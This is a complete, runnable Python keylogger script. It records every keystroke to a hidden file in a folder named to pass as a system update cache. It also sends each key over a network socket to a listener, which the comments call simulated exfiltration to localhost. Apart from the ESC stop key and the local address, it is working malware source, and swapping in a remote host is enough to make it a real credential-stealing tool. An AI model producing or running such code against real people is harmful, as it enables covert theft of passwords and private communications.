"""
- Logs keystrokes to a hidden file
- Sends each key to a localhost "remote" listener (simulated exfil)
"""
import os
import socket
from pynput import keyboard

LOG_FILE   = "/tmp/.sys_update_cache/keys.log"
EXFIL_HOST = "127.0.0.1"
EXFIL_PORT = 9009

os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)


def format_key(key):
    """Turn pynput key object into a printable string."""
    try:
        return key.char                      # normal chars
    except AttributeError:
        return f"[{key.name.upper()}]"       # e.g. [ENTER], [SPACE]


def exfil(payload: str):
    """Send one keystroke to the localhost listener. Silent on failure."""
    try:
        with socket.create_connection((EXFIL_HOST, EXFIL_PORT), timeout=1) as s:
            s.sendall(payload.encode())
    except OSError:
        pass  # listener down — just keep logging


def on_press(key):
    ch = format_key(key)

    # 1) Log to hidden file
    with open(LOG_FILE, "a") as f:
        f.write(ch)
        f.flush()

    # 2) Simulate exfiltration
    exfil(ch)

    # Stop on ESC so the demo is easy to end cleanly
    if key == keyboard.Key.esc:
        print("[*] ESC pressed — stopping keylogger.")
        return False


if __name__ == "__main__":
    print(f"[*] Keylogger running. Logging to {LOG_FILE}")
    print(f"[*] Exfiltrating to {EXFIL_HOST}:{EXFIL_PORT}")
    print("[*] Press ESC inside the display to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()